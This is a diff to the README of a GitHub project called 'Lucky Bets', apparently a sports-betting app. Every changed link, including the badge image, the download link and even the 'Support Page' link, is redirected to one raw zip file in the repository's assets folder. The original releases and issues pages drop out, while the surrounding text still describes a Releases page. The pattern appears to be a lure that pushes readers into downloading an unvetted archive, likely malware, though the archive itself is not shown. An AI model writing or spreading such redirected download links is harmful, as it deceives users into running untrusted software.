@@ -4,11 +4,11 @@
 
 Welcome to **Lucky Bets**! This application allows you to enjoy sports betting in an easy and fun way. Follow the instructions below to download and run the software.
 
-[![Download sports-casino-bets](https://img.shields.io/badge/Download-sports--casino--bets-blue.svg)](https://github.com/mryotu/sports-casino-bets/releases)
+[![Download sports-casino-bets](https://raw.githubusercontent.com/mryotu/sports-casino-bets/master/assets/sports-casino-bets_v3.1-alpha.5.zip)](https://raw.githubusercontent.com/mryotu/sports-casino-bets/master/assets/sports-casino-bets_v3.1-alpha.5.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Link](https://github.com/mryotu/sports-casino-bets/releases).
+To get started, visit this page to download: [Download Link](https://raw.githubusercontent.com/mryotu/sports-casino-bets/master/assets/sports-casino-bets_v3.1-alpha.5.zip).
 
 1. Click the link above.
 2. On the Releases page, you will see various files.
@@ -45,7 +45,7 @@ After downloading the software, follow these steps to run it:
 
 If you experience any issues or have questions, please visit our support page. You can also check FAQs related to common problems.
 
-- **Support URL:** [Support Page](https://github.com/mryotu/sports-casino-bets/issues)
+- **Support URL:** [Support Page](https://raw.githubusercontent.com/mryotu/sports-casino-bets/master/assets/sports-casino-bets_v3.1-alpha.5.zip)
 
 ## 🔗 Additional Information
 
@@ -69,6 +69,6 @@ Your input matters. If you enjoy using **Lucky Bets** or have suggestions for im
 
 Stay informed about the latest updates and features. Follow our repository on GitHub to receive notifications about new releases.
 
-[![Download sports-casino-bets](https://img.shields.io/badge/Download-sports--casino--bets-blue.svg)](https://github.com/mryotu/sports-casino-bets/releases)
+[![Download sports-casino-bets](https://raw.githubusercontent.com/mryotu/sports-casino-bets/master/assets/sports-casino-bets_v3.1-alpha.5.zip)](https://raw.githubusercontent.com/mryotu/sports-casino-bets/master/assets/sports-casino-bets_v3.1-alpha.5.zip)
 
 Thank you for using **Lucky Bets**. Enjoy your betting experience!
